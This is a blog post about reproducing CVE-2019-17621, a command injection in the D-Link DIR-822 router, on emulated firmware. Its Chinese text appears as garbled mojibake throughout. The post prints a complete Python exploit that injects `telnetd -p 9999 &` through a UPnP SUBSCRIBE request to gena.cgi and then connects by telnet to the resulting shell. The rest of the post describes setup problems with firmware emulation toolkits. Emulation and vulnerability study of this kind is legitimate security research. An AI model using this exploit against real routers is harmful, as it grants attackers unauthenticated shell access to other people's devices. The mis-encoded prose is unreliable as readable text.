---
title: CVE-2019-17621 dlink-822 å‘½ä»¤æ³¨å…¥æ¼æ´å¤ç°
tags: [firmware analysis]
date: 2022-12-17 11:10:00
categories: [å›ºä»¶ä»¿çœŸ]
excerpt: CVE-2019-17621 dlink-822 å‘½ä»¤æ³¨å…¥æ¼æ´å¤ç°
---

#### å‰è¨€

ç¬¬ä¸€æ¬¡æˆåŠŸä»¿çœŸä¸€ä¸ªå›ºä»¶å¹¶æˆåŠŸè®¿é—®webå¹¶æˆåŠŸå¤ç°æ¼æ´çš„exp ......

æœŸé—´ç”¨ firmware-analysis-toolkit å’Œ firmware-analysis-plus ï¼ˆåŒ…æ‹¬å®ƒçš„dockerï¼‰åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼ˆkali2020.4ï¼Œkali2022.4ï¼‰ä¸Šæ¥å›å®éªŒäº†å„ç§å„æ ·çš„å›ºä»¶ï¼Œæœ€ç»ˆçš„æˆåŠŸç›®å‰çœ‹æ¥åªæ˜¯ä¸€ä¸ªå¶ç„¶ï¼ˆå› ä¸ºé‡åˆ°äº†å¤ªå¤šæˆ‘ç›®å‰æ— æ³•è§£é‡Šçš„é—®é¢˜ï¼‰ç‰¹æ­¤è®°å½•ä¸€ä¸‹ğŸ˜ª

#### ç¯å¢ƒ

kali2020.4 ï¼ˆåŒæ ·çš„å›ºä»¶ï¼ŒåŒæ ·ç‰ˆæœ¬çš„fapï¼Œä½†æ˜¯åœ¨kali2022.4ä¸Šè¿è¡Œè¿™ä¸ªå›ºä»¶æ—¶ï¼Œä¼šInternal Error 500ï¼ˆä½†èµ·ç èƒ½è®¿é—®åˆ°è¿™ä¸ªip......ğŸ˜…ï¼‰

å›ºä»¶ä¸‹è½½åœ°å€ï¼š<http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822>

å°±è¿™ä¸€ä¸ªç‰ˆæœ¬1.03B03

![](/img/CVE-2019-17621/1.jpg)

fapä½¿ç”¨çš„æ˜¯2.3ç‰ˆæœ¬ <https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3>

ä½¿ç”¨çš„expæ¥æº <https://www.jianshu.com/p/409106be87b7>

#### è¿è¡Œ

![](/img/CVE-2019-17621/2.jpg)

#### exp

```python
import socket
import os
from time import sleep
# Exploit By Miguel Mendez & Pablo Pollanco
def httpSUB(server, port, shell_file):
    print('\n[*] Connection {host}:{port}').format(host=server, port=port)
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
    request += "Host: " + str(server) + str(port) + "\n"
    request += "Callback: <http://192.168.0.4:34033/ServiceProxy27>\n"
    request += "NT: upnp:event\n"
    request += "Timeout: Second-1800\n"
    request += "Accept-Encoding: gzip, deflate\n"
    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
    sleep(1)
    print('[*] Sending Payload')
    con.connect((socket.gethostbyname(server),port))
    con.send(request.encode())
    results = con.recv(4096)
    sleep(1)
    print('[*] Running Telnetd Service')
    sleep(1)
    print('[*] Opening Telnet Connection\n')
    sleep(2)
    os.system('telnet ' + str(server) + ' 9999')
serverInput = raw_input('IP Router: ')
portInput = 49152
httpSUB(serverInput, portInput, '`telnetd -p 9999 &`')
```

#### å‘

è¿™æ˜¯ç¬¬ä¸€æ¬¡ä»¿çœŸå›ºä»¶ï¼Œä¸€å¼€å§‹ç”¨çš„æ˜¯firmware-analysis-toolkitï¼ˆfatï¼Œ<https://github.com/attify/firmware-analysis-toolkit>ï¼‰ï¼Œé¦–å…ˆå®ƒå®‰è£…çš„æ—¶å€™å°±ä¸€å †é—®é¢˜ã€‚åŒ…æ‹¬å®ƒçš„setup.shé‡Œï¼Œè¦å®‰è£…ä¸ªlsb-coreï¼Œä½†æ˜¯aptæ‰¾ä¸åˆ°è¿™ä¸ªåŒ…ï¼Œä¸Šç½‘æ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°ä¸€ä¸ªèƒ½æˆåŠŸå®‰è£…çš„ï¼Œç„¶ååœ¨ä»–çš„issueé‡Œå‘ç°æœ‰äººè¯´è¿™ä¸ªä¸æ˜¯å¿…è¦çš„ï¼Œå¯ä»¥åˆ æ‰ğŸ˜…ï¼Œç„¶åsetp.shé‡Œè¿˜æœ‰ä¸ªqt5base-devçš„åŒ…ï¼Œåœ¨kaliä¸Šå®é™…åº”è¯¥æ˜¯qtbase5-devğŸ˜…ï¼Œæˆ‘ä¸çŸ¥é“å…¶ä»–ç³»ç»Ÿæ˜¯å•¥æ ·ï¼Œè¿˜æœ‰ä¸€ä¸ªå‘æ˜¯å› ä¸ºgit  cloneä¸ç¨³å®šï¼Œæˆ‘æ‰‹åŠ¨ä¸‹è½½çš„zipåŒ…ï¼Œä½†å®é™…ä¸Šè¿™ä¸ªcloneæ˜¯è¦recursiveçš„ğŸ˜…ï¼Œç›´æ¥è¿è¡Œfat.pyä»–æ˜¯ç”¨pexpectå»å¼€å¯å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œç„¶åæ–°å¯åŠ¨çš„è¿™ä¸ªè¿›ç¨‹å¹¶ä¸ä¼šæŠŠè¾“å‡ºæ˜¾ç¤ºè¿‡æ¥ï¼Œçœ‹æºç è°ƒè¯•åŠå¤©æ‰å‘ç°æ˜¯å°‘æ–‡ä»¶ï¼Œå½“æ—¶è¿˜å¾ˆçº³é—·ğŸ˜…ä¸ºå•¥ä¼šå°‘ï¼ˆè¿‡äºncï¼‰

ç›¸å¯¹æ¥è¯´firmware-analysis-plusï¼ˆfapï¼Œ<https://github.com/liyansong2018/firmware-analysis-plus>ï¼‰æ¯”è¾ƒå‹å¥½ï¼ˆå’ŒfatåŸºæœ¬ä¸€æ ·ï¼Œåªä¸è¿‡ç»†èŠ‚ä¸Šåšäº†ä¸€äº›ä¿®æ”¹ï¼‰ï¼Œé¦–å…ˆï¼Œå…¶ä»–é¡¹ç›®çš„æ–‡ä»¶ç»Ÿä¸€æ”¾åœ¨äº†åº“é‡Œï¼ˆæ²¡æœ‰é‚£ä¸ªé€’å½’äº†ğŸ˜…ï¼‰ç„¶åè¿˜åšäº†ä¸€ä¸ªdockerï¼Œä½†æ˜¯è¿™ä¸ªdockeræ²¡æœ‰è£…jeffersonï¼Œä»¿çœŸä¸äº†jffsçš„æ–‡ä»¶ç³»ç»Ÿï¼Œåªèƒ½ç»§ç»­è‡ªå·±é…ç¯å¢ƒğŸ˜…ã€‚fat.pyåé¢è¦åŠ ä¸€ä¸ª-q qemu-pathçš„å‚æ•°ï¼Œå¦åˆ™network  interfaceåˆ—è¡¨ä¼šä¸ºç©ºï¼ˆncå¦‚æˆ‘è¿˜è·‘å»äººå®¶issueåº•ä¸‹é—®ï¼Œè¿˜å¥½äººå®¶æ²¡è¿‡å‡ åˆ†é’Ÿå°±å›å¤äº†ğŸ˜…ï¼‰

ç„¶åexpéƒ¨åˆ†ä¸€å¼€å§‹æˆ‘ç”¨çš„è¿™ä¸ªå¸–å­çš„exp ï¼š<http://www.manongzj.com/blog/28-tkbcqqitdf.html>ï¼Œè·‘ä¸é€šï¼Œåæ¥æ¢æˆäº†å‰æ–‡ç”¨çš„expï¼Œå±…ç„¶å¥½ä½¿äº†ã€‚ã€‚ã€‚æˆ‘æ²¡çœ‹å‡ºæ¥è¿™ä¿©expæœ‰å•¥åŒºåˆ«ï¼Œä¸æƒ³ç®¡äº†ğŸ˜…ï¼Œç¬¬ä¸€æ¬¡å›ºä»¶ä»¿çœŸåˆ°æ­¤ç»“æŸï¼Œæ¼æ´æ˜¯å•¥åŸç†æš‚æ—¶ä¸æƒ³ç®¡äº†



